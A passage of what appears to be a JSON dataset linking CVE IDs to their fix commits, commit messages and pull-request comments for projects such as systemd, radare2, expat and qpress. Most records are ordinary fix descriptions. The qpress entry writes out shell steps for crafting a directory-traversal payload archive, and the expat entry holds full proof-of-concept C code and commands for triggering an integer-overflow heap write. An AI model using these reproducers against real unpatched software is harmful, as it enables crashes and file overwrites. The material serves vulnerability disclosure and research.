[process](https://cveform.mitre.org/) before I'm happy to help out. @legoktm Thx for your last comment. For the moment I don\u2019t have a strong opinion on this but understand the rationals. It seems as well your have a clearer opinion on the next release than I do. But, considering this PR to be closed, could you please open a new ticket with this arguments and why you woukd like to request early release of 10.1.0?",
            "pr_title_words": 5,
            "comments_words": 294,
            "total_other_info_words": 299
        },
        {
            "cve-id": "CVE-2022-2526",
            "commit_url": "https://github.com/systemd/systemd/commit/d973d94dec349fb676fdd844f6fe2ada3538f27c",
            "commit_msg": "resolved: pin stream while calling callbacks for it\n\nThese callbacks might unref the stream, but we still have to access it,\nlet's hence ref it explicitly.\n\nMaybe fixes: #10725",
            "commit_msg_words": 29,
            "other_info": "a number of resolved fixes travis-ci fails with the following error:\r\n```\r\n../src/resolve/resolved-dns-stream.c:52:49: error: unused variable 'ref' [-Werror,-Wunused-variable]\r\n        _cleanup_(dns_stream_unrefp) DnsStream *ref = dns_stream_ref(s); /* Protect stream while we process it */\r\n                                                ^\r\n1 error generated.\r\n```\r\nPlease add `_unused_` attribute.\r\n\r\nBTW, changes seem to be reasonable. Force pushed a new version with `_unused_` added. No other changes. Taking liberty to make this with the green label, given that @yuwata found these changes \"reasonable\" ;-)",
            "pr_title_words": 5,
            "comments_words": 69,
            "total_other_info_words": 74
        },
        {
            "cve-id": "CVE-2022-0265",
            "commit_url": "https://github.com/hazelcast/hazelcast/commit/4d6b666cd0291abd618c3b95cdbb51aa4208e748",
            "commit_msg": "Add helper method to XmlUtil to enable XXE protection in the SAXParserFactory and XMLInputFactory (#20407)",
            "commit_msg_words": 15,
            "other_info": "Add helper method to XmlUtil to enable XXE protection in the SAXParserFactory Just attaching for reference:\r\n\r\nhttps://huntr.dev/bounties/d63972a2-b910-480a-a86b-d1f75d24d563/\r\n\r\nThanks for the (cc). Thanks for the reviews, Ondra & Franta. Does this issue affect older releases (3.x & 4.x)? Will there be an updated 4.x release? > Does this issue affect older releases (3.x & 4.x)?\r\n\r\nThe affected code isn't present in the 3.x and it doesn't have a known call path (out of tests) in hazelcast or hazelcast-enterprise versions 4.y and 5.0. Still, @joschi prepared backports of the fix to 4.y.z and 5.0.z branches so the fix will be present there too.\r\n\r\n> Will there be an updated 4.x release?\r\n\r\nNext versions should include the patch. > > Does this issue affect older releases (3.x & 4.x)?\r\n> \r\n> The affected code isn't present in the 3.x and it doesn't have a known call path (out of tests) in hazelcast or hazelcast-enterprise versions 4.y and 5.0. Still, @joschi prepared backports of the fix to 4.y.z and 5.0.z branches so the fix will be present there too.\r\n> \r\nIf this doesn't affect anything older than 4.y, then can you contact NIST and have the CPE for [CVE-2022-0265](https://nvd.nist.gov/vuln/detail/CVE-2022-0265) adjusted to denote this fact?\r\n The CPE was updated to `cpe:2.3:a:hazelcast:hazelcast:5.1:beta1:*:*:*:*:*:*`, but the OWASP checker now reports `5.1` as vulnerable one. See jeremylong/DependencyCheck#4208",
            "pr_title_words": 12,
            "comments_words": 206,
            "total_other_info_words": 218
        },
        {
            "cve-id": "CVE-2022-1244",
            "commit_url": "https://github.com/radareorg/radare2/commit/2b77b277d67ce061ee6ef839e7139ebc2103c1e3",
            "commit_msg": "Fix oobread in dyldcache ##crash\n\n* Reported by @hdthky via huntr.dev\n* Reproducers: poc1\n* BountyID: 8ae2c61a-2220-47a5-bfe8-fe6d41ab1f82",
            "commit_msg_words": 17,
            "other_info": "Fix oobread in dyldcache ##crash",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2022-24949",
            "commit_url": "https://github.com/MisterTea/EternalTerminal/commit/900348bb8bc96e1c7ba4888ac8480f643c43d3c3",
            "commit_msg": "red fixes (#468)\n\n* red fixes\r\n\r\n* remove magic number",
            "commit_msg_words": 10,
            "other_info": "red fixes ## [Codecov](https://app.codecov.io/gh/MisterTea/EternalTerminal/pull/468?dropdown=coverage&src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci) Report\nAttention: Patch coverage is `50.00000%` with `4 lines` in your changes missing coverage. Please review.\n> Project coverage is 70.34%. Comparing base [(`d22f361`)](https://app.codecov.io/gh/MisterTea/EternalTerminal/commit/d22f36158b825ae455adbefda0bc6c9267e6563a?dropdown=coverage&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci) to head [(`11a7718`)](https://app.codecov.io/gh/MisterTea/EternalTerminal/commit/11a771897965cc439fe91c4508b67817a6c38814?dropdown=coverage&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci).\n> Report is 117 commits behind head on master.\n\n| [Files with missing lines](https://app.codecov.io/gh/MisterTea/EternalTerminal/pull/468?dropdown=coverage&src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci) | Patch % | Lines |\n|---|---|---|\n| [src/terminal/forwarding/PortForwardHandler.cpp](https://app.codecov.io/gh/MisterTea/EternalTerminal/pull/468?src=pr&el=tree&filepath=src%2Fterminal%2Fforwarding%2FPortForwardHandler.cpp&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci#diff-c3JjL3Rlcm1pbmFsL2ZvcndhcmRpbmcvUG9ydEZvcndhcmRIYW5kbGVyLmNwcA==) | 0.00% | [2 Missing :warning: ](https://app.codecov.io/gh/MisterTea/EternalTerminal/pull/468?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci) |\n| [src/base/LogHandler.cpp](https://app.codecov.io/gh/MisterTea/EternalTerminal/pull/468?src=pr&el=tree&filepath=src%2Fbase%2FLogHandler.cpp&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci#diff-c3JjL2Jhc2UvTG9nSGFuZGxlci5jcHA=) | 0.00% | [1 Missing :warning: ](https://app.codecov.io/gh/MisterTea/EternalTerminal/pull/468?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci) |\n| [src/terminal/TerminalClient.cpp](https://app.codecov.io/gh/MisterTea/EternalTerminal/pull/468?src=pr&el=tree&filepath=src%2Fterminal%2FTerminalClient.cpp&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci#diff-c3JjL3Rlcm1pbmFsL1Rlcm1pbmFsQ2xpZW50LmNwcA==) | 0.00% | [1 Missing :warning: ](https://app.codecov.io/gh/MisterTea/EternalTerminal/pull/468?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci) |\n\n<details><summary>Additional details and impacted files</summary>\n\n\n```diff\n@@            Coverage Diff             @@\n##           master     #468      +/-   ##\n==========================================\n- Coverage   70.69%   70.34%   -0.35%     \n==========================================\n  Files          46       46              \n  Lines        2740     2745       +5     \n==========================================\n- Hits         1937     1931       -6     \n- Misses        803      814      +11     \n```\n\n</details>\n\n[:umbrella: View full report in Codecov by Sentry](https://app.codecov.io/gh/MisterTea/EternalTerminal/pull/468?dropdown=coverage&src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci).   \n:loudspeaker: Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci).\n\n<details><summary> :rocket: New features to boost your workflow: </summary>\n\n- :snowflake: [Test Analytics](https://docs.codecov.com/docs/test-analytics): Detect flaky tests, report on failures, and find test suite problems.\n</details>",
            "pr_title_words": 2,
            "comments_words": 164,
            "total_other_info_words": 166
        },
        {
            "cve-id": "CVE-2022-29184",
            "commit_url": "https://github.com/gocd/gocd/commit/37d35115db2ada2190173f9413cfe1bc6c295ecb",
            "commit_msg": "Improve escaping of arguments when constructing Hg command calls",
            "commit_msg_words": 9,
            "other_info": "Improve hg command building",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2022-45748",
            "commit_url": "https://github.com/assimp/assimp/commit/2d717b71d75f6b2d027638d686e3a95350d52206",
            "commit_msg": "ColladaParser: check values length\n\nfixes: #4286",
            "commit_msg_words": 6,
            "other_info": "ColladaParser: check values length Merged, thanks a lot for your contribution.",
            "pr_title_words": 4,
            "comments_words": 7,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2022-39310",
            "commit_url": "https://github.com/gocd/gocd/commit/a644a7e5ed75d7b9e46f164fb83445f778077cf9",
            "commit_msg": "Refactor & fix tests after RMI interface is simplified to always include `AgentRuntimeInfo`",
            "commit_msg_words": 13,
            "other_info": "Authorize agents remoting by UUID",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2022-39367",
            "commit_url": "https://github.com/davemckain/qtiworks/commit/1a46d6d842877ba2b824d5c269845827e2e0ccac",
            "commit_msg": "vuln-fix: Zip Slip Vulnerability\n\nThis fixes a Zip-Slip vulnerability.\n\nThis change does one of two things. This change either\n\n1. Inserts a guard to protect against Zip Slip.\nOR\n2. Replaces `dir.getCanonicalPath().startsWith(parent.getCanonicalPath())`, which is vulnerable to partial path traversal attacks, with the more secure `dir.getCanonicalFile().toPath().startsWith(parent.getCanonicalFile().toPath())`.\n\nFor number 2, consider `\"/usr/outnot\".startsWith(\"/usr/out\")`.\nThe check is bypassed although `/outnot` is not under the `/out` directory.\nIt's important to understand that the terminating slash may be removed when using various `String` representations of the `File` object.\nFor example, on Linux, `println(new File(\"/var\"))` will print `/var`, but `println(new File(\"/var\", \"/\")` will print `/var/`;\nhowever, `println(new File(\"/var\", \"/\").getCanonicalPath())` will print `/var`.\n\nWeakness: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nSeverity: High\nCVSSS: 7.4\nDetection: CodeQL (https://codeql.github.com/codeql-query-help/java/java-zipslip/) & OpenRewrite (https://public.moderne.io/recipes/org.openrewrite.java.security.ZipSlip)\n\nReported-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\nSigned-off-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\n\nBug-tracker: https://github.com/JLLeitschuh/security-research/issues/16\n\nCo-authored-by: Moderne <team@moderne.io>",
            "commit_msg_words": 141,
            "other_info": "[SECURITY] Fix Zip Slip Vulnerability @JLLeitschuh: Many thanks for reporting this problem. I've merged in your pull request. (I've subsequently changed the handling of these bad ZIP entries to follow the existing \"bad zip\" handling.) Hi @davemckain,\nDo you need any assistance with vulnerability disclosure and potential CVE issuance?",
            "pr_title_words": 5,
            "comments_words": 44,
            "total_other_info_words": 49
        },
        {
            "cve-id": "CVE-2022-1451",
            "commit_url": "https://github.com/radareorg/radare2/commit/0927ed3ae99444e7b47b84e43118deb10fe37529",
            "commit_msg": "Fix oobread crash in java parser ##crash\n\n* Reported by @bet4it via @huntrdev\n* BountyID: 229a2e0d-9e5c-402f-9a24-57fa2eb1aaa7\n* Reproducer: poc4java",
            "commit_msg_words": 19,
            "other_info": "Fix oobread crash in java parser ##crash",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2022-0239",
            "commit_url": "https://github.com/stanfordnlp/CoreNLP/commit/1940ffb938dc4f3f5bc5f2a2fd8b35aabbbae3dd",
            "commit_msg": "Fix XML schema vulnerability",
            "commit_msg_words": 4,
            "other_info": "Fix XML schema vulnerability do you have a release date for the next (patch) version which includes this fix (for CVE-2022-0198)? Just did!  Look for 4.4.0",
            "pr_title_words": 4,
            "comments_words": 22,
            "total_other_info_words": 26
        },
        {
            "cve-id": "CVE-2022-32265",
            "commit_url": "https://github.com/wolkykim/qdecoder/commit/ce7c8a7ac450a823a11b06508ef1eb7441241f81",
            "commit_msg": "security update: add check on improperly encoded input",
            "commit_msg_words": 8,
            "other_info": "security update: add check on improperly encoded input",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2022-44940",
            "commit_url": "https://github.com/NixOS/patchelf/commit/96c8422e374064c3407e73e8b1e4995f95e0a9e0",
            "commit_msg": "Out-of-bounds read exists in the function modifyRPath",
            "commit_msg_words": 7,
            "other_info": "Fix Out-of-bounds read in the function modifyRPath bors merge",
            "pr_title_words": 7,
            "comments_words": 2,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2022-45866",
            "commit_url": "https://github.com/PierreLvx/qpress/commit/02a79a793f56e86e2014a606647b158b246811e3",
            "commit_msg": "Fix qpress directory traversal vulnerability\n\nA bad actor user can prepare the payload as:\n\n```\nmkdir -p AAAAAAAAA/secure_file_priv_dir\ntouch AAAAAAAAA/secure_file_priv_dir/evil.so\nqpress -r AAAAAAAAA payload.qp\nThen edit the payload.qp in a hex editor or sed to replace AAAAAAAAA with ../../../\n(example: sed -i 's/AAAAAAAAA/..\\/..\\/..\\//' payload.qp)\n```\n\nFix bug by checking the directory and reject the command if find the attempt to traversal\n\nTest: see example above and try to reproduce it. Before fix you can observe\ntraversal. After fix - the error message(File path contains directory traversal\nwhich is not allowed.) shown, no traversal observe.\n\nAll new code of the whole pull request, including one or several files\nthat are either new files or modified ones, are contributed under the BSD-new\nlicense.  I am contributing on behalf of my employer Amazon Web Services,\nInc.",
            "commit_msg_words": 133,
            "other_info": "Fix qpress directory traversal vulnerability Thank you! Thanks for merging. Did you edit the commit before merging? It is no longer identical with our submission. Relevant fields such as author was changed.\r\n\r\nThis PR https://patch-diff.githubusercontent.com/raw/PierreLvx/qpress/pull/6.patch and merged commit https://github.com/PierreLvx/qpress/commit/ddb312090ebd5794e81bc6fb1dfb4e79eda48761.patch differ. I used Github's online interface to perform the merge.\r\n\r\nIt automatically edited the author (without any notice) and message but the code is unchanged. See:\r\n\r\n```\r\n\u279c  ~ diff 6.patch ddb312090ebd5794e81bc6fb1dfb4e79eda48761.patch\r\n1,4c1,4\r\n< From 02a79a793f56e86e2014a606647b158b246811e3 Mon Sep 17 00:00:00 2001\r\n< From: Mikhail Chalov <mcchalov@amazon.com>\r\n< Date: Wed, 14 Jul 2021 09:35:58 +0200\r\n< Subject: [PATCH] Fix qpress directory traversal vulnerability\r\n---\r\n> From ddb312090ebd5794e81bc6fb1dfb4e79eda48761 Mon Sep 17 00:00:00 2001\r\n> From: Mikhail Chalov <mike.chalov@gmail.com>\r\n> Date: Fri, 19 Aug 2022 14:33:18 -0700\r\n> Subject: [PATCH] Fix qpress directory traversal vulnerability (#6)\r\n25a26,27\r\n>\r\n> Co-authored-by: Mikhail Chalov <mcchalov@amazon.com>\r\n```",
            "pr_title_words": 5,
            "comments_words": 135,
            "total_other_info_words": 140
        },
        {
            "cve-id": "CVE-2022-25892",
            "commit_url": "https://github.com/galkahana/HummusJS/commit/a9bf2520ab5abb69f9328906e406fbebfb36159a",
            "commit_msg": "corrections",
            "commit_msg_words": 1,
            "other_info": "Npe corrections pending on travis build enablement",
            "pr_title_words": 2,
            "comments_words": 5,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2022-45693",
            "commit_url": "https://github.com/jettison-json/jettison/commit/cf6a4a1f85416b49b16a5b0c5c0bb81a4833dbc8",
            "commit_msg": "Fixing StackOverflow error",
            "commit_msg_words": 3,
            "other_info": "Fixing StackOverflow error",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2022-24704",
            "commit_url": "https://github.com/accel-ppp/accel-ppp/commit/d4cb89721cc8e5b3dd3fbefaf173eb77ecb85615",
            "commit_msg": "fix buffer overflow when receive radius packet\nThis patch fixes buffer overflow if radius packet contains invalid atribute length\nand attrubute type from the following list: ipv4addr, ipv6addr, ipv6prefix or ifid\n\nReported-by: Chloe Ong\nReported-by: Eugene Lim <spaceraccoon@users.noreply.github.com>\nReported-by: Kar Wei Loh\n\nSigned-off-by: Sergey V. Lobanov <sergey@lobanov.in>",
            "commit_msg_words": 47,
            "other_info": "fix buffer overflow when receive radius packet Thanks @svlobanov , could you add one more credit:\r\n\r\nReported-by: Chloe Ong\r\nReported-by: Eugene Lim spaceraccoon@users.noreply.github.com\r\nReported-by: Kar Wei Loh\r\n\r\nThe patched code looks fine.\r\n\r\nThank you!\r\n\r\n Apologies @svlobanov, we spotted one more issue, the size has not been specified for the `ipv6prefix` case. It is possible to overflow there too. @spaceraccoon  thank you, the patch has been updated Hi @svlobanov , looks great, thanks!",
            "pr_title_words": 7,
            "comments_words": 65,
            "total_other_info_words": 72
        },
        {
            "cve-id": "CVE-2022-22888",
            "commit_url": "https://github.com/jerryscript-project/jerryscript/commit/73ab9eeef6c486869445a1ac7e3b8bd64e35d24f",
            "commit_msg": "Prevent stack-overflow in json internalize property\n\nThis patch fixes #4848.\n\nJerryScript-DCO-1.0-Signed-off-by: Robert Fancsik robert.fancsik@h-lab.eu",
            "commit_msg_words": 14,
            "other_info": "Prevent stack-overflow in json internalize property",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2022-25315",
            "commit_url": "https://github.com/libexpat/libexpat/commit/eb0362808b4f9f1e2345a0cf203b8cc196d776d9",
            "commit_msg": "Prevent integer overflow in storeRawNames\n\nIt is possible to use an integer overflow in storeRawNames for out of\nboundary heap writes. Default configuration is affected. If compiled\nwith XML_UNICODE then the attack does not work. Compiling with\n-fsanitize=address confirms the following proof of concept.\n\nThe problem can be exploited by abusing the m_buffer expansion logic.\nEven though the initial size of m_buffer is a power of two, eventually\nit can end up a little bit lower, thus allowing allocations very close\nto INT_MAX (since INT_MAX/2 can be surpassed). This means that tag\nnames can be parsed which are almost INT_MAX in size.\n\nUnfortunately (from an attacker point of view) INT_MAX/2 is also a\nlimitation in string pools. Having a tag name of INT_MAX/2 characters\nor more is not possible.\n\nExpat can convert between different encodings. UTF-16 documents which\ncontain only ASCII representable characters are twice as large as their\nASCII encoded counter-parts.\n\nThe proof of concept works by taking these three considerations into\naccount:\n\n1. Move the m_buffer size slightly below a power of two by having a\n   short root node <a>. This allows the m_buffer to grow very close\n   to INT_MAX.\n2. The string pooling forbids tag names longer than or equal to\n   INT_MAX/2, so keep the attack tag name smaller than that.\n3. To be able to still overflow INT_MAX even though the name is\n   limited at INT_MAX/2-1 (nul byte) we use UTF-16 encoding and a tag\n   which only contains ASCII characters. UTF-16 always stores two\n   bytes per character while the tag name is converted to using only\n   one. Our attack node byte count must be a bit higher than\n   2/3 INT_MAX so the converted tag name is around INT_MAX/3 which\n   in sum can overflow INT_MAX.\n\nThanks to our small root node, m_buffer can handle 2/3 INT_MAX bytes\nwithout running into INT_MAX boundary check. The string pooling is\nable to store INT_MAX/3 as tag name because the amount is below\nINT_MAX/2 limitation. And creating the sum of both eventually overflows\nin storeRawNames.\n\nProof of Concept:\n\n1. Compile expat with -fsanitize=address.\n\n2. Create Proof of Concept binary which iterates through input\n   file 16 MB at once for better performance and easier integer\n   calculations:\n\n```\ncat > poc.c << EOF\n #include <err.h>\n #include <expat.h>\n #include <stdlib.h>\n #include <stdio.h>\n\n #define CHUNK (16 * 1024 * 1024)\n int main(int argc, char *argv[]) {\n   XML_Parser parser;\n   FILE *fp;\n   char *buf;\n   int i;\n\n   if (argc != 2)\n     errx(1, \"usage: poc file.xml\");\n   if ((parser = XML_ParserCreate(NULL)) == NULL)\n     errx(1, \"failed to create expat parser\");\n   if ((fp = fopen(argv[1], \"r\")) == NULL) {\n     XML_ParserFree(parser);\n     err(1, \"failed to open file\");\n   }\n   if ((buf = malloc(CHUNK)) == NULL) {\n     fclose(fp);\n     XML_ParserFree(parser);\n     err(1, \"failed to allocate buffer\");\n   }\n   i = 0;\n   while (fread(buf, CHUNK, 1, fp) == 1) {\n     printf(\"iteration %d: XML_Parse returns %d\\n\", ++i,\n       XML_Parse(parser, buf, CHUNK, XML_FALSE));\n   }\n   free(buf);\n   fclose(fp);\n   XML_ParserFree(parser);\n   return 0;\n }\nEOF\ngcc -fsanitize=address -lexpat -o poc poc.c\n```\n\n3. Construct specially prepared UTF-16 XML file:\n\n```\ndd if=/dev/zero bs=1024 count=794624 | tr '\\0' 'a' > poc-utf8.xml\necho -n '<a><' | dd conv=notrunc of=poc-utf8.xml\necho -n '><' | dd conv=notrunc of=poc-utf8.xml bs=1 seek=805306368\niconv -f UTF-8 -t UTF-16LE poc-utf8.xml > poc-utf16.xml\n```\n\n4. Run proof of concept:\n\n```\n./poc poc-utf16.xml\n```",
            "commit_msg_words": 537,
            "other_info": "[CVE-2022-25315] lib: Prevent integer overflow in storeRawNames This issue appears to be [CVE-2022-25315](https://www.cve.org/CVERecord?id=CVE-2022-25315)",
            "pr_title_words": 7,
            "comments_words": 6,
            "total_other_info_words": 13
        },
        {
            "cve-id": "CVE-2022-29869",
            "commit_url": "https://github.com/piastry/cifs-utils/commit/8acc963a2e7e9d63fe1f2e7f73f5a03f83d9c379",
            "commit_msg": "mount.cifs: fix verbose messages on option parsing\n\nWhen verbose logging is enabled, invalid credentials file lines may be\ndumped to stderr. This may lead to information disclosure in particular\nconditions when the credentials file given is sensitive and contains '='\nsigns.\n\nBug: https://bugzilla.samba.org/show_bug.cgi?id=15026\n\nSigned-off-by: Jeffrey Bencteux <jbe@improsec.com>\nReviewed-by: David Disseldorp <ddiss@suse.de>",
            "commit_msg_words": 51,
            "other_info": "mount.cifs: two bug fixes Merged. Thanks! CVE-2022-29869 is assigned for the issue fixed by this commit. Do you want me to put CVE-2022-29869 prefix to the title of the commit before pushing to git.samba.org, so it is more visible? @piastry I guess it's not strictly needed, and would only do it if it does not cause issues with the commit history. Ok, will leave things as is to not cause conflicts to anyone who has already fetched the changes.",
            "pr_title_words": 4,
            "comments_words": 75,
            "total_other_info_words": 79
        },
        {
            "cve-id": "CVE-2022-31196",
            "commit_url": "https://github.com/vran-dev/databasir/commit/226c20e0c9124037671a91d6b3e5083bd2462058",
            "commit_msg": "fix: security vulnerability SSRF (#256)",
            "commit_msg_words": 5,
            "other_info": "fix: security vulnerability SSRF",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2022-41985",
            "commit_url": "https://github.com/weston-embedded/uC-FTPs/commit/83393f6129fc5a77cbdf287c6fd9745cb53d8d04",
            "commit_msg": "Patched DoS vulnerability CVE-2022-41985 / TALOS-2022-1680. Fixed bug\nwithin FTPs_Init() that could cause an invalid socket ID to be pased to\nthe FTPs Server Task.",
            "commit_msg_words": 25,
            "other_info": "Patched DoS vulnerability CVE-2022-41985 / TALOS-2022-1680. Fixed bug within FTPs_Init() that could cause an invalid socket ID to be pased to the FTPs Server Task.",
            "pr_title_words": 25,
            "comments_words": 0,
            "total_other_info_words": 25
        },
        {
            "cve-id": "CVE-2022-37704",
            "commit_url": "https://github.com/zmanda/amanda/commit/43c5b32f46186f3ed78fe6c7503096fa9ad1236c",
            "commit_msg": "fix : fix increment logic for good_option\n\n- for arguements of type --file=x or --file x, fixed logic while incrementing value.",
            "commit_msg_words": 21,
            "other_info": "Fixes Open Vulnerability CVE-2022-37705",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2022-4494",
            "commit_url": "https://github.com/bspkrs/MCPMappingViewer/commit/6e602746c96b4756c271d080dae7d22ad804a1bd",
            "commit_msg": "vuln-fix: Zip Slip Vulnerability\n\nThis fixes a Zip-Slip vulnerability.\n\nThis change does one of two things. This change either\n\n1. Inserts a guard to protect against Zip Slip.\nOR\n2. Replaces `dir.getCanonicalPath().startsWith(parent.getCanonicalPath())`, which is vulnerable to partial path traversal attacks, with the more secure `dir.getCanonicalFile().toPath().startsWith(parent.getCanonicalFile().toPath())`.\n\nFor number 2, consider `\"/usr/outnot\".startsWith(\"/usr/out\")`.\nThe check is bypassed although `/outnot` is not under the `/out` directory.\nIt's important to understand that the terminating slash may be removed when using various `String` representations of the `File` object.\nFor example, on Linux, `println(new File(\"/var\"))` will print `/var`, but `println(new File(\"/var\", \"/\")` will print `/var/`;\nhowever, `println(new File(\"/var\", \"/\").getCanonicalPath())` will print `/var`.\n\nWeakness: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nSeverity: High\nCVSSS: 7.4\nDetection: CodeQL (https://codeql.github.com/codeql-query-help/java/java-zipslip/) & OpenRewrite (https://public.moderne.io/recipes/org.openrewrite.java.security.ZipSlip)\n\nReported-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\nSigned-off-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\n\nBug-tracker: https://github.com/JLLeitschuh/security-research/issues/16\n\nCo-authored-by: Moderne <team@moderne.io>",
            "commit_msg_words": 141,
            "other_info": "[SECURITY] Fix Zip Slip Vulnerability Hi @bspkrs,\r\n\r\nDo you believe this fixed a legitimate security vulnerability? If so, do you need assistance with vulnerability disclosure and CVE issuance? @JLLeitschuh I believe that the vulnerability in question is low-risk (not for everyone, just in the case of this application), but I have decided to accept the code change because leaving bad examples around for everyone to learn wrong from is certainly not helping anyone. Also, in the unlikely event that the nexus repo housing the zip artifacts that are pulled and extracted by this code is ever compromised, this simple change will prevent the vulnerability from causing issues for unsuspecting users.\r\n\r\nAs far as disclosure, I can probably handle that. Most people that use this application or even know of its existence probably follow me or someone else who would care enough about this type of tweet to retweet it to the community it affects.\r\n\r\nLastly, thanks for reaching out. I know this was an automated system, but I whole-heartedly approve of the idea and I hope that others can see the same benefits that I do in a system that scans public code for vulnerabilities and informs authors. > I have decided to accept the code change because leaving bad examples around for everyone to learn wrong from is certainly not helping anyone.\n\nI absolutely agree! \ud83d\ude42\n\n> Lastly, thanks for reaching out. I know this was an automated system, but I whole-heartedly approve of the idea and I hope that others can see the same benefits that I do in a system that scans public code for vulnerabilities and informs authors.\n\nAutomatically generated at-scale, but with a real person at the wheel. I'm glad you found this useful. I get a lot of mixed feedback, but I'm gad you found it helped, and I really appreciate your response here \ud83d\ude42\n\nIf you want assistance getting a CVE number (a standard way of disclosing to the industry writ-large) please don't hesitate to reach out for assistance. I'm more than happy to help",
            "pr_title_words": 5,
            "comments_words": 337,
            "total_other_info_words": 342
        },
        {
            "cve-id": "CVE-2022-31291",
            "commit_url": "https://github.com/COVESA/dlt-daemon/commit/44c814c469eb89cca218a41341d9de5016c5d096",
            "commit_msg": "Fix a double-free bug.\n\nIn the dlt_config_file_set_section function of dlt_config_file_parser.c:\n  s-name is not set to null after free.\n  It will be freed again in the dlt_config_file_release function.\n\nSigned-off-by: Zhongyang.Bao <Zhongyang.Bao@zeekrlife.com>",
            "commit_msg_words": 30,
            "other_info": "dlt_config_file_parser.c\uff1aFix a pointer release bug in the file\u3002 Thanks @Safe-BCY ,\r\nI strongly believe that the commit message should be updated instead of only \"bb\".\r\nPlease kindly update (please refer to other commits for format)\r\nThanh > \r\nThank you, I will resubmit according to the format.\r\n > Thanks @Safe-BCY , I strongly believe that the commit message should be updated instead of only \"bb\". Please kindly update (please refer to other commits for format) Thanh\r\n\r\nThe format has been modified as required, please check\u3002\r\n further information\uff1aThe Same pointer\uff08s->name\uff09is freed again in the dlt_config_file _release\u3002\r\n\r\nvoid dlt_config_file_release(DltConfigFile *file)\r\n{\r\n    int i = 0;\r\n\r\n    if (file != NULL) {\r\n        int max = file->num_sections;\r\n\r\n        for (i = 0; i < max; i++) {\r\n            DltConfigFileSection *s = &file->sections[i];\r\n            DltConfigKeyData *node = file->sections[i].list;\r\n            free(s->name);    //free again\u3002\r\n\r\n            if (s->keys != NULL)\r\n                free(s->keys);\r\n\r\n            while (node) {\r\n                DltConfigKeyData *tmp = node;\r\n                node = node->next;\r\n                free(tmp->key);\r\n                free(tmp->data);\r\n                free(tmp);\r\n            }\r\n        }\r\n\r\n        free(file->sections);\r\n        free(file);\r\n    }\r\n}\r\n @Safe-BCY \r\nWell, it looks like you just update information in your comment, not about the commit message itself.\r\nWe still see same as before. You can check via tab \"Commits\" in this PR.\r\nThank you,\r\nThanh > @Safe-BCY Well, it looks like you just update information in your comment, not about the commit message itself. We still see same as before. You can check via tab \"Commits\" in this PR. Thank you, Thanh\r\n\r\n Sorry, this is the first time I submit PR.Please see if what I submit now meets the requirements. @Safe-BCY ,\r\n1. In case you want to update your commit, please update via \"amend\". Then you will see one commit instead of two now in your develop branch.\r\n2. In your commit message, I think there are several references for you:\r\nhttps://gist.github.com/robertpainsi/b632364184e70900af4ab688decf6f53 \r\n3. The information in your current commit message could be shared via the conversation of PR. Then you still can keep the commit message clean, short and informative.\r\n4. Please add sign-off at the end of git commit message.\r\n\r\nThank you,\r\nThanh Thank you. I have revised it again. Please check it, please. @Safe-BCY \r\nIt is good now. Thank you very much!  > @Safe-BCY It is good now. Thank you very much!\r\n\r\nMay I ask if you can help apply for CVE number? @thanhbnq  May I ask if you can help apply for CVE number? CVE-2022-31291 seems to have been assigned for this issue. > CVE-2022-31291 seems to have been assigned for this issue.\r\n\r\nThank you.",
            "pr_title_words": 8,
            "comments_words": 397,
            "total_other_info_words": 405
        },
        {
            "cve-id": "CVE-2022-41882",
            "commit_url": "https://github.com/nextcloud/desktop/commit/f9949ee0de1b8a42412f528dc1f64e080eb44316",
            "commit_msg": "edit locally requires a valid token\n\ncheck on server that the token received during a request to open a local\nfile is indeed a valid one\n\nSigned-off-by: Matthieu Gallien <matthieu.gallien@nextcloud.com>",
            "commit_msg_words": 30,
